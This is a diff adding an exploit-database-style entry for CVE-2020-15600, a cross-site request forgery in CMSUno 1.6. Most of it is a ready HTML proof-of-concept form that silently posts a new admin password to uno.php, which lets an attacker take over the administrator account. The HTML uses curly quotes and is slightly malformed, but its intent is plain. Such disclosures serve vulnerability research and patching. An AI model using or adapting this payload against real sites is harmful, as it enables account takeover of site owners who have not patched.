@@ -1,0 +1,22 @@
+# Exploit Title: CMSUno 1.6 - Cross-Site Request Forgery (Change Admin Password)
+# Date: 2020-05-31
+# Exploit Author: Noth
+# Vendor Homepage: https://github.com/boiteasite/cmsuno
+# Software Link: https://github.com/boiteasite/cmsuno
+# Version: v1.6
+# CVE : 2020-15600
+
+An issue was discovered in CMSUno before 1.6.1. uno.php allows CSRF to change the admin password.
+
+PoC : 
+
+<html>
+<body>
+<script>history.pushState(",",'/')</script>
+<form action=“http://127.0.0.1/cmsuno-master/uno.php”method=“POST”>
+<input type=“hidden” name=“user” value=“admin”/>
+<input type=“hidden” name=“pass” value=“yourpassword”/>
+<input type=“submit” name=“user” value=“Submit request”/>
+</form>
+</body>
+</html>
